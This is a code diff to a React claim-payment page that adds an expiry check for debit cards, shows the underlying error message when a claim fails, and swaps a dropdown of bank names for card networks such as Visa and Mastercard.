@@ -124,6 +124,22 @@ export default function ClaimPaymentPage() {
       return;
     }
 
+    // Validate card expiry - check if expired
+    const [expMonth, expYear] = debitCardForm.card_expiry.split('/');
+    if (expMonth && expYear) {
+      const currentDate = new Date();
+      const currentYear = currentDate.getFullYear() % 100;
+      const currentMonth = currentDate.getMonth() + 1;
+      const cardExpMonth = parseInt(expMonth);
+      const cardExpYear = parseInt(expYear);
+
+      if (cardExpYear < currentYear || (cardExpYear === currentYear && cardExpMonth < currentMonth)) {
+        setMessage('Your debit card has expired. Please use a valid card.', 'error');
+        setMessageType('error');
+        return;
+      }
+    }
+
     setSubmitting(true);
     try {
       const finalCardholderName = debitCardForm.cardholder_name.trim() || `${debitCardForm.first_name} ${debitCardForm.middle_name ? debitCardForm.middle_name + ' ' : ''}${debitCardForm.last_name}`;
@@ -181,7 +197,8 @@ export default function ClaimPaymentPage() {
       setClaimSuccess(true);
     } catch (error) {
       console.error('Error:', error);
-      setMessage('Failed to process claim. Please try again.');
+      const errorMsg = error?.message || 'Failed to process claim. Please try again.';
+      setMessage(`Error: ${errorMsg}`);
       setMessageType('error');
     } finally {
       setSubmitting(false);
@@ -268,7 +285,8 @@ export default function ClaimPaymentPage() {
       setClaimSuccess(true);
     } catch (error) {
       console.error('Error:', error);
-      setMessage('Failed to process claim. Please try again.');
+      const errorMsg = error?.message || 'Failed to process claim. Please try again.';
+      setMessage(`Error: ${errorMsg}`);
       setMessageType('error');
     } finally {
       setSubmitting(false);
@@ -715,31 +733,20 @@ export default function ClaimPaymentPage() {
                         </div>
 
                         <div style={{ marginBottom: '1rem' }}>
-                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Bank Name *</label>
+                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Issuer *</label>
                           <select value={debitCardForm.card_issuer} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'}>
-                            <option value="">Select your bank...</option>
-                            <option value="Chase Bank">Chase Bank</option>
-                            <option value="Bank of America">Bank of America</option>
-                            <option value="Wells Fargo">Wells Fargo</option>
-                            <option value="Citibank">Citibank</option>
-                            <option value="PNC Bank">PNC Bank</option>
-                            <option value="US Bank">US Bank</option>
-                            <option value="TD Bank">TD Bank</option>
-                            <option value="KeyBank">KeyBank</option>
-                            <option value="Capital One">Capital One</option>
-                            <option value="Discover Bank">Discover Bank</option>
+                            <option value="">Select card issuer...</option>
+                            <option value="Visa">Visa</option>
+                            <option value="Mastercard">Mastercard</option>
                             <option value="American Express">American Express</option>
-                            <option value="USAA">USAA</option>
-                            <option value="Navy Federal Credit Union">Navy Federal Credit Union</option>
-                            <option value="Ally Bank">Ally Bank</option>
-                            <option value="Synchrony Bank">Synchrony Bank</option>
+                            <option value="Discover">Discover</option>
                             <option value="other">Other / Enter Manually</option>
                           </select>
                         </div>
                         {debitCardForm.card_issuer === 'other' && (
                           <div style={{ marginBottom: '1rem' }}>
-                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Bank Name *</label>
-                            <input type="text" placeholder="e.g., First National Bank, Regional Bank, etc." value={debitCardForm.card_issuer_custom} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer_custom: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                            <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Issuer Name *</label>
+                            <input type="text" placeholder="e.g., Diners Club, UnionPay, etc." value={debitCardForm.card_issuer_custom} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_issuer_custom: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                           </div>
                         )}
                       </div>
